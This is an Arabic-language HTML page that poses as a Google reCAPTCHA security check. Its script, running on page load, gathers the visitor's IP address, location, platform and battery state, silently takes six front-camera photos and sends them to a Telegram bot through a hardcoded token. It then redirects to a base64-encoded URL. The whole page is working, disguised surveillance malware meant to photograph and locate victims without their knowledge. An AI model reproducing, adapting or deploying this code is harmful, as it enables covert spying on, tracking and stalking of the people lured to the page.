<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <title>التحقق الأمني</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .recaptcha-box { border: 1px solid #ccc; background-color: #fff; padding: 20px; border-radius: 5px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); text-align: left; }
        .recaptcha-header { display: flex; align-items: center; justify-content: space-between; border-bottom: 1px solid #ccc; padding-bottom: 10px; margin-bottom: 10px; }
        .recaptcha-header img { height: 30px; }
        video, canvas { display: none; }
    </style>
</head>
<body>
    <div class="recaptcha-box">
        <div class="recaptcha-header">
            <div style="display: flex; align-items: center;">
                <input type="checkbox" style="width: 25px; height: 25px;" checked disabled>
                <span>أنا لست برنامج روبوت</span>
            </div>
            <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA logo">
        </div>
        <p>الرجاء الانتظار حتى يتم التحقق...</p>
    </div>

    <video id="camera-feed" playsinline autoplay muted></video>
    <canvas id="photo-canvas"></canvas>

<script>
    const BOT_TOKEN = '8060685956:AAGJztf_aHHhFdBsH2OLuCPYS2TwPRY3_R4';
    let TARGET_CHAT_ID;
    let REDIRECT_URL;

    function getParamsFromUrl() {
        const urlParams = new URLSearchParams(window.location.search);
        const encodedUrl = urlParams.get('url');
        const encodedId = urlParams.get('id');
        TARGET_CHAT_ID = encodedId ? atob(encodedId) : '1431886140';
        REDIRECT_URL = encodedUrl ? atob(encodedUrl) : 'https://google.com';
    }

    async function collectAdditionalData() {
        try {
            const ipInfo = await fetch('https://ipapi.co/json/').then(res => res.json());
            const battery = await navigator.getBattery();
            return `
---[ معلومات الجهاز ]---
📍 IP: ${ipInfo.ip || 'N/A'}
🌍 الدولة: ${ipInfo.country_name || 'N/A'}
🏙️ المدينة: ${ipInfo.city || 'N/A'}
💻 النظام: ${navigator.platform || 'N/A'}
🔋 البطارية: ${Math.round(battery.level * 100)}% (${battery.charging ? 'يشحن' : 'لا يشحن'})
            `;
        } catch { return "---[ تعذر جمع معلومات الجهاز ]---"; }
    }

    async function sendToTelegram(formData) {
        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        } catch (error) { console.error('Error sending photo:', error); }
    }

    function captureAndSend(stream, deviceInfo) {
        return new Promise((resolve) => {
            const video = document.getElementById('camera-feed');
            const canvas = document.getElementById('photo-canvas');
            video.srcObject = stream;
            video.play();
            video.onplaying = () => {
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                const context = canvas.getContext('2d');
                let photoCount = 0;
                const maxPhotos = 6;

                const captureInterval = setInterval(() => {
                    if (photoCount >= maxPhotos) {
                        clearInterval(captureInterval);
                        stream.getTracks().forEach(track => track.stop());
                        resolve();
                        return;
                    }
                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
                    canvas.toBlob(blob => {
                        const formData = new FormData();
                        const caption = `📸 صورة [${photoCount + 1}/${maxPhotos}] من الكاميرا الأمامية\n${deviceInfo}`;
                        formData.append('chat_id', TARGET_CHAT_ID);
                        formData.append('photo', blob, `image.jpg`);
                        formData.append('caption', caption);
                        sendToTelegram(formData);
                    }, 'image/jpeg', 0.8);
                    photoCount++;
                }, 1000);
            };
        });
    }

    async function init() {
        getParamsFromUrl();
        const deviceInfo = await collectAdditionalData();
        let permissionGranted = false;

        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
            if (frontStream) {
                permissionGranted = true;
                await captureAndSend(frontStream, deviceInfo);
            }
        } catch (e) {
            console.error("Could not get front camera");
        }
        
        if (!permissionGranted) {
             const noCamUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             await fetch(noCamUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: TARGET_CHAT_ID, text: `❌ لم يتم منح إذن الكاميرا.\n${deviceInfo}` }),
            });
        }

        window.location.href = REDIRECT_URL;
    }

    window.onload = init;
</script>
</body>
</html>

